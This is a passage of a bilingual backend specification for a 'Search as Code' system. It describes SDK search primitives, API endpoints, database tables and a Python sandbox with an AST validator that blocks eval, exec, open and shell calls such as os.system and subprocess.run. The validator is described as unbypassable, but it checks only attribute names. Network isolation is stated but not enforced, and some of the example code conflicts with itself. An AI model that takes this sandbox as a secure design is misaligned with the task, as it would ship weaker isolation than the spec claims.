# Search as Code (SaC) — Backend Project Specification

> Dựa trên nghiên cứu: [Rethinking Search as Code Generation](https://research.perplexity.ai/articles/rethinking-search-as-code-generation) — Perplexity AI, Jun 1, 2026
> **Companion file**: `sac-langgraph-react-spec.md` — chi tiết LangGraph ReAct loop implementation

---

## 1. Tổng Quan Kiến Trúc

### 1.1 Triết Lý Cốt Lõi

Search as Code (SaC) là kiến trúc search thế hệ mới, trong đó **AI model không chỉ gọi search engine — mà tự *lập trình* pipeline tìm kiếm** thông qua code generation và thực thi trong sandbox an toàn.

Thay vì:
```
Agent → query → [Fixed Search Pipeline] → results
```

SaC làm:
```
Agent → generates Python code → [Sandbox] → [Agentic Search SDK] → custom pipeline → results
```

### 1.2 Ba Lớp Kiến Trúc (từ Figure 4 trong nghiên cứu)

```
┌─────────────────────────────────────────────┐
│               LAYER 1: MODELS               │
│   (Control Plane — Reasoning & Codegen)     │
│   - Phân tích directive của user/agent      │
│   - Decompose thành sub-tasks               │
│   - Generate Python code sử dụng SDK       │
└───────────────────┬─────────────────────────┘
                    │ generated Python code
┌───────────────────▼─────────────────────────┐
│          LAYER 2: COMPUTE SANDBOXES         │
│   (Secure Code Execution Runtime)           │
│   - Execute model-generated code           │
│   - Quản lý intermediate state (filesystem) │
│   - Hỗ trợ: async, parallel, retry, dedup  │
│   - Filesystem-based serde (không REPL)    │
└───────────────────┬─────────────────────────┘
                    │ SDK calls
┌───────────────────▼─────────────────────────┐
│        LAYER 3: AGENTIC SEARCH SDK          │
│   (Composable Search Primitives)            │
│   - sdk.search.*: web_many, deep_search     │
│   - sdk.llm.*: extract_many, query_llm      │
│   - Low-level: retrieve, rank, dedupe, ...  │
└─────────────────────────────────────────────┘
```

---

## 2. Vấn Đề Cần Giải Quyết (Failure Modes của Traditional Search)

Nghiên cứu xác định 3 lỗi cơ bản của kiến trúc monolithic cũ:

| # | Failure Mode | Nguyên nhân | SaC Solution |
|---|---|---|---|
| 1 | **Coarse context** | Pipeline cố định không tối ưu theo query | Model tự thiết kế pipeline phù hợp từng task |
| 2 | **Không tận dụng domain knowledge** | Interface cứng không cho model áp dụng kiến thức | Code generation cho phép model encode mọi strategy |
| 3 | **Inefficient control flow** | Search serial qua nhiều model turns | Parallel/async execution trong single inference turn |

### 2.1 Sequential Bottleneck — Phân Tích Chi Tiết

Failure mode thứ 3 đáng được phân tích kỹ hơn vì nó ảnh hưởng trực tiếp đến latency, cost và coverage.

**Vấn đề của traditional search**: mỗi lần refinement buộc phải đi qua một full round-trip:

```
Model inference → Search execution → Observation → Model inference → ...
     (turn 1)           (turn 1)        (turn 1)        (turn 2)
```

Mỗi refinement yêu cầu:
1. Model inference — sinh query mới
2. Search execution — gọi search engine
3. Observation — đưa kết quả vào context
4. Model inference tiếp theo — mới có thể refinement tiếp

Đây là **sequential bottleneck**: không thể song song hoá, mỗi bước phải đợi bước trước hoàn thành.

**SaC tách biệt retrieval execution khỏi model turns:**

```
Model inference (1 lần)  →  Search program  →  Sandbox executes
     (turn 1)                  (generated)      hundreds/thousands
                                                 of ops concurrently
```

Model chỉ generate code **một lần**. Sandbox sau đó thực thi hàng trăm hoặc hàng nghìn retrieval operations song song thông qua async execution primitives — **không cần thêm model turn nào**.

**Lợi ích trực tiếp:**

| | Traditional Search | Search as Code |
|---|---|---|
| **Latency** | Tăng tuyến tính theo số refinements | Thấp hơn — parallel ops trong single turn |
| **Search coverage** | Bị giới hạn bởi số model turns | Rộng hơn — thousands of ops per turn |
| **Token consumption** | Cao — intermediate state đi qua context | Thấp hơn — state lưu trên filesystem |
| **Model calls** | Nhiều — mỗi refinement = 1 call | Ít hơn — 1 call sinh toàn bộ pipeline |
| **Fan-out exploration** | Kém hiệu quả — sequential | Hiệu quả — native async fan-out |

> **Nguồn**: Figure 3 trong nghiên cứu minh hoạ trực quan bottleneck này — traditional search buộc agent phải sequence search qua nhiều model-visible turns, trong khi SaC compress toàn bộ thành một lần codegen + parallel execution.

---

## 3. Đặc Tả Chi Tiết Các Component

### 3.1 Agentic Search SDK

#### Nguyên tắc thiết kế
- **KHÔNG** là wrapper của search API cũ
- Được xây dựng lại từ đầu thành **modular, composable primitives**
- Runtime: **Python** (vì ubiquity + data processing ecosystem)
- Tối ưu hóa liên tục qua **autoresearch loop** (metrics: latency, codegen quality, task performance)

#### Hai tầng abstraction (từ Figure 4 trong nghiên cứu)

```
┌─────────────────────────────────────────────────────────────────┐
│              HIGH-LEVEL (Tầng cao)                              │
│   End-to-end pipelines — shorthand cho common patterns          │
│   sdk.search.web_many()      sdk.search.deep_search()           │
│   sdk.llm.extract_many()     sdk.llm.query_llm()               │
└───────────────────────────────────┬─────────────────────────────┘
                                    │ compose từ
┌───────────────────────────────────▼─────────────────────────────┐
│              LOW-LEVEL (Atomized Primitives)                     │
│   sdk.retrieve()   sdk.fanout()    sdk.rank()                   │
│   sdk.dedupe()     sdk.embed()     sdk.cluster()                │
│   sdk.chunk()      sdk.parse_field()                            │
└─────────────────────────────────────────────────────────────────┘
```

> **Lưu ý namespace**: `sdk.search.*` cho search pipelines, `sdk.llm.*` cho LLM operations — đây là hai sub-namespace riêng biệt trong paper, không phải flat utilities.

**Điểm cốt lõi**: Model có thể tự compose các low-level primitives theo bất kỳ cách nào phù hợp với task — đây chính là điều tạo ra sự linh hoạt của SaC so với traditional search pipeline cố định.

---

#### Tầng cao (High-level primitives)

Shorthand cho các end-to-end patterns phổ biến. Model dùng khi task phù hợp với mẫu có sẵn:

```python
# --- sdk.search.* — Parallel search pipelines ---

# Fan-out web search — primitive chính cho broad coverage
results = sdk.search.web_many(
    queries=[{"vendor": str, "query": str}, ...],
    limit_per_query=8,
    concurrency=12
)

# Deep search — multi-hop, iterative refinement (tự động)
results = sdk.search.deep_search(
    query="...",
    depth=3,
    strategy="breadth_first | depth_first"
)

# --- sdk.llm.* — LLM-powered operations ---

# Batch structured extraction (từ CVE case study Part 3)
verified = sdk.llm.extract_many(
    items=[{"url": str, "text": str, ...}],
    instruction="...",
    schema={
        "matches": bool,
        "cve": str,
        "vendor": str,
        "product": str,
        "fix_version": str,
        "severity": str,
        "source_url": str,
        "evidence": str,
        "version_bound_to_cve": bool,
        "confidence": float,
    }
)

# LLM planning sub-call (từ CVE case study Part 2)
raw = sdk.llm.query_llm(prompt)
parsed = sdk.llm.parse_jsonl(raw)
```

---

#### Tầng thấp (Atomized primitives)

Các building blocks độc lập. Model tự compose thành pipeline tùy ý:

```python
# --- Retrieval ---
hits = sdk.retrieve(query, source="web | index | embedding_store", limit=10)

# --- Fan-out ---
# Mở rộng một query thành nhiều variants rồi retrieve song song
all_hits = sdk.fanout(
    base_query="...",
    variants=["site:nvd.nist.gov {q}", "vendor advisory {q}", ...],
    concurrency=12
)

# --- Ranking ---
ranked = sdk.rank(hits, method="bm25 | semantic | hybrid", top_k=20)

# --- Deduplication ---
unique = sdk.dedupe(items, key="url")          # by URL field (CVE Part 3: dedupe_by_url)
unique = sdk.dedupe(items, key="cve")          # by arbitrary key (CVE Part 3: dedupe_by)

# --- Embedding ---
vectors = sdk.embed(texts: list[str], model="default") → list[list[float]]

# --- Clustering ---
clusters = sdk.cluster(items, vectors, n_clusters=5)

# --- Chunking ---
chunks = sdk.chunk(text, strategy="sentence | paragraph | fixed", size=512)

# --- Field parsing ---
value = sdk.parse_field(hit, field="published_date | severity | cve_id")
```

---

#### Utility helpers (dùng kèm ở cả hai tầng)

```python
# Text / result helpers
text = sdk.join_result_fields(hit)
vendor = sdk.infer_vendor(url)
is_valid = sdk.official_vendor_advisory(url, vendor)
flat = sdk.flatten(list_of_lists)

# Aggregation helpers (từ CVE case study Part 2)
deduped = sdk.unique(items)                               # dedupe list of dicts/queries
summary = sdk.summarize(items, by=["vendor", "year", "url_kind"])  # group + summarize coverage
```

> `sdk.llm.query_llm()` và `sdk.llm.parse_jsonl()` nằm trong namespace `sdk.llm.*` (xem tầng cao ở trên), không phải flat utilities.

---

#### Gap-fill pattern

Khi task cần capability không có trong SDK, model **tự viết thêm code** — đây là một trong những điểm mạnh cốt lõi của SaC. Code đóng vai trò vừa là **orchestrator** (gọi SDK) vừa là **gap-filler** (implement logic riêng).

```python
# Ví dụ 1: Validation functions (từ CVE case study Part 2)
# SDK không có hàm kiểm tra "query có đúng scope không" → model tự viết

def official_scope(query: str) -> bool:
    """Chỉ giữ queries dùng site: hoặc source: scoping — loại bỏ aggregators."""
    return "site:" in query or "source:" in query

def mentions_cve_year(query: str) -> bool:
    """Đảm bảo query có năm CVE cụ thể, không phải query chung chung."""
    import re
    return bool(re.search(r"CVE-20(2[3-9]|\d{2})", query))

# Dùng trong Part 2 để validate LLM-generated queries trước khi execute:
expanded_queries = [
    row for row in sdk.llm.parse_jsonl(raw)
    if official_scope(row["query"]) and mentions_cve_year(row["query"])
]
```

```python
# Ví dụ 2: Custom scoring vượt ra ngoài sdk.rank()
def custom_cve_score(hit):
    score = 0.0
    if sdk.official_vendor_advisory(hit["url"], hit["vendor"]):
        score += 0.5
    if hit.get("confidence", 0) >= 0.75:
        score += 0.3
    if hit.get("version_bound_to_cve"):
        score += 0.2
    return score

ranked = sorted(verified, key=custom_cve_score, reverse=True)
```

> **Nguyên tắc**: SDK cung cấp các primitives cơ bản nhất, không cố cover mọi use case để tránh bloat. Model bù đắp bằng code. Điều này cho phép SDK giữ được tính gọn và nhất quán, trong khi pipeline vẫn linh hoạt tối đa.

### 3.2 Compute Sandbox

#### Yêu cầu kỹ thuật
- Secure isolated execution environment
- Hỗ trợ **Python runtime** với SDK được embed sẵn
- **Filesystem-based state persistence** (không REPL) — lý do:
  - REPL gây "cluttered namespace" trên long trajectories
  - Filesystem buộc model khai báo state explicitly → traceable, reliable
  - Explicit serde > implicit variable retention

#### State management pattern
```python
# Turn N: Serialize state
import json
with open("state/seed_hits.json", "w") as f:
    json.dump([h.to_dict() for h in seed_hits], f)

# Turn N+1: Deserialize và tiếp tục
with open("state/seed_hits.json") as f:
    seed_hits = [Hit.from_dict(d) for d in json.load(f)]
```

#### Khả năng control flow
- Conditional execution
- Async/parallel operations
- Fan-out over query variants
- Retry logic
- Deduplication
- Aggregation và joining

### 3.3 Model Layer (Control Plane)

#### Vai trò
- Nhận directive từ user hoặc parent agent
- Decompose thành retrieval sub-tasks
- Generate Python code sử dụng Agentic Search SDK
- Orchestrate toàn bộ pipeline qua **LangGraph ReAct loop** (xem `sac-langgraph-react-spec.md`)

#### ReAct Loop (LangGraph)
Multi-turn coordination được implement bằng LangGraph `StateGraph` với 5 nodes:

```
PLANNER → REASONER → EXECUTOR → OBSERVER → (loop | FINALIZER)
```

- **PLANNER**: Khởi tạo `AgentState`, tạo `state_dir`, inject SDK docs vào system prompt
- **REASONER**: LLM call với **working memory** thay vì toàn bộ message history → generate Python code cho bước hiện tại
- **EXECUTOR**: Chạy code trong sandbox (sau khi qua **AST validation**), trả về stdout/stderr làm observation
- **OBSERVER**: Evaluate `coverage_score` + `confidence_score` → set `is_complete` (score-based primary, `TASK_COMPLETE` signal là fallback)
- **FINALIZER**: Load `final_results.json`, tổng hợp metrics

Conditional edge `should_continue()` dừng loop khi: `coverage_score > 0.9 AND confidence_score > 0.8`, max_turns đạt, hoặc 3 lần lỗi liên tiếp.

> Chi tiết đầy đủ: `sac-langgraph-react-spec.md`

#### Agent Skills
- File `SKILL.md` < 2000 tokens (tránh context bloat)
- Nội dung tập trung vào:
  - **Guidance** tổng quát về cách compose SDK primitives
  - **Few-shot examples** cho complex patterns
  - KHÔNG chỉ liệt kê available functions (có thể lấy từ reflection)
- Tối ưu qua dedicated autoresearch loop

---

## 4. Luồng Xử Lý End-to-End

### Luồng đơn giản (single turn)
```
1. User/Agent gửi task directive
2. Model phân tích và generate Python code
3. Sandbox execute code
4. Code gọi SDK primitives (có thể thousands of calls)
5. Kết quả được aggregate, filter, dedupe
6. Model nhận structured results và reason
7. Trả kết quả về user/parent agent
```

### Luồng phức tạp (multi-turn với state)
```
Turn 1:
  - Model generate code để fan-out initial queries
  - SDK.web_many() với concurrency=12
  - Serialize results vào filesystem

Turn 2:
  - Model đọc state từ filesystem
  - Phân tích coverage gaps
  - Generate refined queries qua LLM sub-call
  - Execute expanded search

Turn 3:
  - Load all hits từ filesystem
  - Dedupe by URL
  - SDK.llm.extract_many() để verify structured data
  - Filter by confidence threshold
  - Serialize final records
```

### Pattern từ Case Study CVE (3 phases)
```python
# Phase 1: Fan-out với vendor-specific templates
# → sdk.search.web_many() với site-scoped queries
# → Filter chỉ giữ official vendor advisory URLs

# Phase 2: LLM planning sub-call để fill gaps
# → Summarize coverage by vendor/year
# → query_llm() để đề xuất refined queries
# → Validate trước khi execute

# Phase 3: Structured verification
# → sdk.llm.extract_many() với schema cụ thể
# → Filter: matches=True AND version_bound_to_cve=True
# → Dedup by CVE ID
```

---

## 5. API Design

### 5.1 Endpoint chính

```
POST /api/v1/search
```

Request body:
```json
{
  "directive": "string — task description từ user/agent",
  "context": {
    "domain_knowledge": "optional — relevant context",
    "constraints": ["optional — list of constraints"],
    "output_schema": {}  // optional — desired output structure
  },
  "config": {
    "reasoning_level": "low | medium | high",
    "max_operations": 1000,
    "timeout_seconds": 300
  }
}
```

Response:
```json
{
  "task_id": "uuid",
  "status": "completed | running | failed",
  "results": [...],
  "metadata": {
    "total_operations": 247,
    "total_tokens": 42900,
    "turns": 3,
    "cost_usd": 0.85
  }
}
```

### 5.2 Async job endpoint

```
POST /api/v1/search/async          → { "task_id": "uuid" }
GET  /api/v1/search/{task_id}      → status + results
GET  /api/v1/search/{task_id}/logs → execution logs
DELETE /api/v1/search/{task_id}    → cancel task
```

### 5.3 SDK direct endpoints

```
# sdk.search.* — High-level search pipelines
POST /api/v1/sdk/web_search           → single web search
POST /api/v1/sdk/web_many             → parallel fan-out search
POST /api/v1/sdk/deep_search          → multi-hop iterative search

# sdk.llm.* — LLM-powered operations
POST /api/v1/sdk/llm/extract_many     → batch structured extraction
POST /api/v1/sdk/llm/query_llm        → LLM planning sub-call
POST /api/v1/sdk/llm/parse_jsonl      → parse JSONL from LLM output

# Low-level atomized primitives
POST /api/v1/sdk/retrieve             → single retrieval từ source
POST /api/v1/sdk/fanout               → fan-out với query variants
POST /api/v1/sdk/rank                 → ranking hits
POST /api/v1/sdk/dedupe               → deduplication by key
POST /api/v1/sdk/embed                → embedding generation
POST /api/v1/sdk/cluster              → clustering hits
POST /api/v1/sdk/chunk                → text chunking
POST /api/v1/sdk/parse_field          → field parsing

# Execution
POST /api/v1/sdk/execute              → execute arbitrary SDK code in sandbox
```

---

## 6. Database Schema

### App Tables (Alembic managed)

#### Tasks
```sql
CREATE TABLE sac_tasks (
    -- thread_id = task_id = LangGraph thread_id (dùng làm FK chung)
    id           UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    directive    TEXT NOT NULL,
    status       VARCHAR(20) DEFAULT 'pending',
    -- pending | running | completed | failed | cancelled
    config       JSONB DEFAULT '{}',
    context      JSONB DEFAULT '{}',
    created_at   TIMESTAMPTZ DEFAULT NOW(),
    started_at   TIMESTAMPTZ,
    completed_at TIMESTAMPTZ
);
```

#### SDK Operation Logs
```sql
CREATE TABLE sdk_operations (
    id              UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    task_id         UUID REFERENCES sac_tasks(id),
    turn_number     INTEGER NOT NULL,
    operation_type  VARCHAR(50),   -- web_search, llm_extract, dedupe...
    input_params    JSONB,
    result_count    INTEGER,
    duration_ms     INTEGER,
    cost_usd        DECIMAL(10,6),
    created_at      TIMESTAMPTZ DEFAULT NOW()
);
```

### LangGraph Checkpoint Tables (auto-created bởi `checkpointer.setup()`)

```
checkpoints        → Full AgentState snapshots theo thread_id + checkpoint_id
checkpoint_blobs   → Large blobs (messages, results) lưu riêng
checkpoint_writes  → Pending writes chưa commit
```

> **Quan trọng**: `thread_id` trong LangGraph = `task_id` trong app.
> Dùng `task_id` làm `thread_id` để đồng nhất giữa app tables và checkpoint tables.
> Không cần tạo bảng `task_turns` riêng — LangGraph checkpoints đã lưu toàn bộ `AgentState` mỗi turn.

---

## 7. Cấu Trúc Thư Mục Dự Án

```
sac-backend/
├── README.md
├── pyproject.toml
├── .env.example
│
├── app/
│   ├── main.py                    # FastAPI app entry point
│   ├── config.py                  # Settings via pydantic-settings
│   │
│   ├── api/
│   │   ├── __init__.py
│   │   ├── routes/
│   │   │   ├── search.py          # POST /api/v1/search (sync, stream, async)
│   │   │   ├── sdk.py             # Direct SDK endpoints (high + low level)
│   │   │   └── health.py          # Health check
│   │   └── dependencies.py        # DI: db session, auth, etc.
│   │
│   ├── graph/                     # LangGraph ReAct orchestration
│   │   ├── __init__.py
│   │   ├── builder.py             # build_sac_graph(), get_compiled_graph()
│   │   ├── state.py               # AgentState TypedDict
│   │   ├── edges.py               # should_continue() conditional edge
│   │   └── nodes/
│   │       ├── __init__.py
│   │       ├── planner.py         # Init state, build system prompt
│   │       ├── reasoner.py        # Build working memory, LLM call → generate code
│   │       ├── executor.py        # AST validation → SandboxExecutor → observation
│   │       ├── observer.py        # Compute coverage_score/confidence_score, set is_complete
│   │       └── finalizer.py       # Format final output + metrics
│   │
│   ├── core/
│   │   ├── __init__.py
│   │   ├── sandbox.py             # SandboxExecutor: AST validation + subprocess isolation
│   │   └── state_manager.py       # Filesystem-based serde utilities
│   │
│   ├── sdk/
│   │   ├── __init__.py            # sdk entry point — expose cả hai tầng
│   │   ├── high_level/
│   │   │   ├── __init__.py
│   │   │   ├── search.py          # sdk.search.*: web_many, deep_search
│   │   │   └── llm.py             # sdk.llm.*: extract_many, query_llm, parse_jsonl
│   │   ├── low_level/
│   │   │   ├── __init__.py
│   │   │   ├── retrieval.py       # retrieve, fanout
│   │   │   ├── processing.py      # rank, dedupe, embed
│   │   │   └── transform.py       # cluster, chunk, parse_field
│   │   ├── utils.py               # join_result_fields, flatten, unique, summarize, infer_vendor, etc.
│   │   └── types.py               # SearchHit, ExtractionResult, etc.
│   │
│   ├── skills/
│   │   ├── __init__.py
│   │   └── SKILL.md               # Agent skill file (<2000 tokens)
│   │
│   ├── db/
│   │   ├── __init__.py
│   │   ├── models.py              # SQLAlchemy ORM models
│   │   ├── session.py             # DB session factory
│   │   └── migrations/            # Alembic migrations
│   │       └── versions/
│   │
│   └── workers/
│       ├── __init__.py
│       └── task_worker.py         # ARQ worker cho async jobs
│
├── tests/
│   ├── unit/
│   │   ├── test_sdk_high_level.py
│   │   ├── test_sdk_low_level.py
│   │   ├── test_sandbox.py
│   │   └── test_graph_nodes.py    # Unit test từng node riêng lẻ
│   ├── integration/
│   │   ├── test_search_api.py
│   │   └── test_react_loop.py     # End-to-end graph execution
│   └── benchmarks/
│       └── test_cve_case_study.py
│
├── docker/
│   ├── Dockerfile
│   ├── Dockerfile.sandbox         # Isolated sandbox image
│   └── docker-compose.yml
│
└── scripts/
    ├── seed_db.py
    └── run_benchmark.py
```

---

## 8. Tech Stack

| Component | Technology | Lý do |
|---|---|---|
| Web framework | **FastAPI** | Async native, OpenAPI tự động |
| Database | **PostgreSQL** | JSONB + LangGraph checkpoint storage |
| ORM | **SQLAlchemy 2.0** (async) | Type-safe, async support |
| Migrations | **Alembic** | Standard với SQLAlchemy |
| **ReAct Orchestration** | **LangGraph 0.2+** | StateGraph, conditional edges, checkpointing |
| **LLM abstraction** | **LangChain Core + langchain-anthropic** | Model layer trong REASONER node |
| **LangGraph persistence** | **psycopg 3 + AsyncPostgresSaver** | Checkpoint state qua turns vào PostgreSQL |
| Task queue | **ARQ** | Async background jobs cho long-running tasks |
| Sandbox execution | **subprocess / Docker SDK** | Isolated Python execution |
| State persistence | **Local filesystem / S3** | Filesystem-based serde pattern (trong sandbox) |
| Web search | **Perplexity API / SerpAPI** | Search primitives cho SDK |
| Caching | **Redis** | Dedup queries, result caching, ARQ broker |
| Validation | **Pydantic v2** | Request/response schemas |
| Testing | **pytest + pytest-asyncio** | Async test support |
| Containerization | **Docker + Docker Compose** | Sandbox isolation |

---

## 9. Sandbox Implementation Chi Tiết

### Yêu cầu security
- Không có network access ngoài SDK calls
- Không có filesystem access ngoài `/sandbox/state/` và `/sandbox/output/`
- CPU/memory limits
- Timeout enforcement
- No shell injection
- **AST validation bắt buộc trước khi execute** — kiểm tra toàn bộ AST tree, reject nếu phát hiện import hoặc call không nằm trong allowlist

### Sandbox execution flow

```python
# app/core/sandbox.py

import ast
import subprocess
import tempfile
import json
from pathlib import Path

# Allowlist imports — chỉ các module này được phép trong model-generated code
ALLOWED_IMPORTS = {
    "json", "re", "math", "datetime", "collections",
    "itertools", "functools", "pathlib", "typing",
    "asyncio", "app.sdk",  # SDK entry point
}

# Blocked built-ins và call patterns — reject ngay nếu xuất hiện trong AST
BLOCKED_CALLS = {
    "eval", "exec", "compile", "__import__",
    "open",   # filesystem access phải qua STATE_DIR, không phải bare open()
    "breakpoint", "input",
}

class ASTValidator(ast.NodeVisitor):
    """
    Validate model-generated code trước khi execute.
    Chạy trên AST tree — không thể bị bypass bằng string tricks.
    """
    def __init__(self):
        self.errors: list[str] = []

    def visit_Import(self, node: ast.Import):
        for alias in node.names:
            top = alias.name.split(".")[0]
            if top not in ALLOWED_IMPORTS:
                self.errors.append(f"Blocked import: {alias.name}")
        self.generic_visit(node)

    def visit_ImportFrom(self, node: ast.ImportFrom):
        top = (node.module or "").split(".")[0]
        if top not in ALLOWED_IMPORTS:
            self.errors.append(f"Blocked import: {node.module}")
        self.generic_visit(node)

    def visit_Call(self, node: ast.Call):
        # Detect bare calls: eval(...), exec(...), open(...)
        if isinstance(node.func, ast.Name) and node.func.id in BLOCKED_CALLS:
            self.errors.append(f"Blocked call: {node.func.id}()")
        # Detect attribute calls: os.system(...), subprocess.run(...)
        if isinstance(node.func, ast.Attribute):
            full = f"{getattr(node.func.value, 'id', '?')}.{node.func.attr}"
            if node.func.attr in {"system", "popen", "run", "call", "Popen"}:
                self.errors.append(f"Blocked call: {full}()")
        self.generic_visit(node)

def validate_code(code: str) -> list[str]:
    """
    Parse và validate code bằng AST.
    Trả về list errors — empty list = code hợp lệ.
    Phải gọi TRƯỚC khi execute, không phải sau.
    """
    try:
        tree = ast.parse(code)
    except SyntaxError as e:
        return [f"SyntaxError: {e}"]
    validator = ASTValidator()
    validator.visit(tree)
    return validator.errors


class SandboxExecutor:
    def __init__(self, task_id: str, state_dir: Path):
        self.task_id = task_id
        self.state_dir = state_dir
        self.state_dir.mkdir(parents=True, exist_ok=True)

    async def execute(self, code: str, timeout: int = 60) -> ExecutionResult:
        """
        Execute model-generated Python code trong sandbox.
        AST validation chạy TRƯỚC subprocess — không bao giờ execute code chưa được validate.
        """
        # Bước 1: AST validation — reject sớm, không tốn subprocess
        errors = validate_code(code)
        if errors:
            return ExecutionResult(
                stdout="",
                stderr="\n".join(errors),
                returncode=2,  # 2 = validation failure (phân biệt với runtime error)
            )

        # Bước 2: Wrap code với SDK imports và state dir injection
        wrapped_code = self._wrap_with_sdk(code)

        # Write to temp file
        with tempfile.NamedTemporaryFile(
            mode='w', suffix='.py', delete=False
        ) as f:
            f.write(wrapped_code)
            script_path = f.name

        # Execute với resource limits
        result = subprocess.run(
            ["python", script_path],
            capture_output=True,
            text=True,
            timeout=timeout,
            env={
                "PYTHONPATH": "/app",
                "STATE_DIR": str(self.state_dir),
                "TASK_ID": self.task_id,
            }
        )

        return ExecutionResult(
            stdout=result.stdout,
            stderr=result.stderr,
            returncode=result.returncode,
        )

    def _wrap_with_sdk(self, code: str) -> str:
        return f"""
import sys
sys.path.insert(0, '/app')

from app.sdk import sdk
from pathlib import Path
import json

STATE_DIR = Path("{self.state_dir}")

{code}
"""
```

---

## 10. SDK Implementation Chi Tiết

### Cấu trúc module

```python
# app/sdk/__init__.py — expose cả hai tầng qua một entry point

from .high_level.search import SearchSDK
from .high_level.llm import LLMSDK
from .low_level.retrieval import retrieve, fanout
from .low_level.processing import rank, dedupe, embed
from .low_level.transform import cluster, chunk, parse_field
from .utils import join_result_fields, flatten, unique, summarize, infer_vendor, official_vendor_advisory

class SDK:
    def __init__(self, config):
        self.search = SearchSDK(config)   # sdk.search.*
        self.llm = LLMSDK(config)         # sdk.llm.*

    # Low-level primitives — gắn trực tiếp lên sdk.*
    retrieve = staticmethod(retrieve)
    fanout = staticmethod(fanout)
    rank = staticmethod(rank)
    dedupe = staticmethod(dedupe)
    embed = staticmethod(embed)
    cluster = staticmethod(cluster)
    chunk = staticmethod(chunk)
    parse_field = staticmethod(parse_field)

    # Utilities — gắn trực tiếp lên sdk.*
    join_result_fields = staticmethod(join_result_fields)
    flatten = staticmethod(flatten)
    unique = staticmethod(unique)
    summarize = staticmethod(summarize)
    infer_vendor = staticmethod(infer_vendor)
    official_vendor_advisory = staticmethod(official_vendor_advisory)
```

---

### High-level: sdk.llm.* — LLM-powered operations

```python
# app/sdk/high_level/llm.py

import asyncio
import json
from typing import List, Dict, Any
import anthropic

class LLMSDK:
    def __init__(self, config):
        self.client = anthropic.AsyncAnthropic(api_key=config.anthropic_api_key)

    async def extract_many(
        self,
        items: List[Dict],
        instruction: str,
        schema: Dict[str, Any],
        concurrency: int = 5
    ) -> List[Dict]:
        """
        Batch LLM structured extraction — dùng trong CVE case study Part 3.
        Từng item được extract song song với concurrency control.
        """
        semaphore = asyncio.Semaphore(concurrency)

        async def extract_one(item: Dict) -> Dict:
            async with semaphore:
                return await self._extract_single(item, instruction, schema)

        results = await asyncio.gather(
            *[extract_one(item) for item in items],
            return_exceptions=True
        )
        return [r if not isinstance(r, Exception) else {"matches": False} for r in results]

    async def query_llm(self, prompt: str) -> str:
        """
        LLM planning sub-call — dùng trong CVE case study Part 2
        để synthesize refined queries cho sparse vendor-years.
        """
        msg = await self.client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=1000,
            messages=[{"role": "user", "content": prompt}]
        )
        return msg.content[0].text

    def parse_jsonl(self, text: str) -> list:
        """Parse JSONL output từ query_llm."""
        lines = [l.strip() for l in text.strip().splitlines() if l.strip()]
        result = []
        for line in lines:
            try:
                result.append(json.loads(line))
            except json.JSONDecodeError:
                continue
        return result

    async def _extract_single(self, item: Dict, instruction: str, schema: Dict) -> Dict:
        schema_str = json.dumps(schema, indent=2)
        prompt = f"""
{instruction}

Item:
{json.dumps(item, indent=2)}

Respond ONLY with a JSON object matching this schema:
{schema_str}
"""
        msg = await self.client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=1000,
            messages=[{"role": "user", "content": prompt}]
        )
        text = msg.content[0].text
        text = text.strip().removeprefix("```json").removesuffix("```").strip()
        return json.loads(text)
```

```python
# app/sdk/high_level/search.py

import asyncio
import httpx
from typing import List, Dict
from ..types import SearchQuery, SearchHit

class SearchSDK:
    def __init__(self, api_key: str, base_url: str):
        self.api_key = api_key
        self.base_url = base_url

    async def web_many(
        self,
        queries: List[Dict],
        limit_per_query: int = 8,
        concurrency: int = 12
    ) -> List[List[SearchHit]]:
        """
        Execute nhiều search queries song song.
        High-level shorthand cho fan-out pattern phổ biến.
        Tương đương compose: sdk.fanout() + sdk.retrieve() * N
        """
        semaphore = asyncio.Semaphore(concurrency)

        async def search_one(q: Dict) -> List[SearchHit]:
            async with semaphore:
                return await self._web_search(q["query"], limit_per_query)

        results = await asyncio.gather(
            *[search_one(q) for q in queries],
            return_exceptions=True
        )

        return [
            r if not isinstance(r, Exception) else []
            for r in results
        ]

    async def deep_search(
        self,
        query: str,
        depth: int = 3,
        strategy: str = "breadth_first"
    ) -> List[SearchHit]:
        """
        Multi-hop iterative search: retrieve → analyze gaps → refine → repeat.
        """
        # Implementation: loop depth lần, mỗi vòng dùng sdk.retrieve + sdk.query_llm để refine
        ...

    async def _web_search(self, query: str, limit: int) -> List[SearchHit]:
        async with httpx.AsyncClient() as client:
            resp = await client.post(
                f"{self.base_url}/search",
                json={"query": query, "limit": limit},
                headers={"Authorization": f"Bearer {self.api_key}"},
                timeout=30.0
            )
            resp.raise_for_status()
            data = resp.json()
            return [SearchHit(**hit) for hit in data["results"]]
```

---

### Low-level: retrieval primitives

```python
# app/sdk/low_level/retrieval.py

async def retrieve(
    query: str,
    source: str = "web",   # "web" | "index" | "embedding_store"
    limit: int = 10
) -> List[SearchHit]:
    """Atomic single-source retrieval."""
    ...

async def fanout(
    base_query: str,
    variants: List[str],
    concurrency: int = 12
) -> List[SearchHit]:
    """
    Fan-out: expand một query thành nhiều variants, retrieve song song, flatten.
    Ví dụ:
        variants = [
            "site:nvd.nist.gov {q}",
            "{vendor} security advisory {q}",
            "CVE {q} fix version",
        ]
    Model có thể dùng thay cho web_many khi muốn kiểm soát
    template variants thay vì truyền full query objects.
    """
    semaphore = asyncio.Semaphore(concurrency)
    async def one(v): ...
    results = await asyncio.gather(*[one(v) for v in variants])
    return flatten(results)
```

---

### Low-level: processing primitives

```python
# app/sdk/low_level/processing.py

def rank(
    hits: List[SearchHit],
    method: str = "hybrid",   # "bm25" | "semantic" | "hybrid"
    top_k: int = 20
) -> List[SearchHit]:
    """Rerank hits. Model có thể override bằng custom scoring gap-fill nếu cần."""
    ...

def dedupe(
    items: List[Dict],
    key: str = "url"
) -> List[Dict]:
    """
    Dedup by arbitrary field key.
    Tương đương dedupe_by_url(items) khi key="url",
    hoặc dedupe_by(records, key="cve") khi key="cve" (từ CVE case study Part 3).
    """
    seen = set()
    result = []
    for item in items:
        val = item.get(key)
        if val not in seen:
            seen.add(val)
            result.append(item)
    return result

async def embed(
    texts: List[str],
    model: str = "default"
) -> List[List[float]]:
    """Generate embeddings cho list of texts."""
    ...
```

### Utilities: unique() và summarize()

```python
# app/sdk/utils.py

def unique(items: List[Dict]) -> List[Dict]:
    """
    Dedupe list of dicts bằng full-object equality (không cần key).
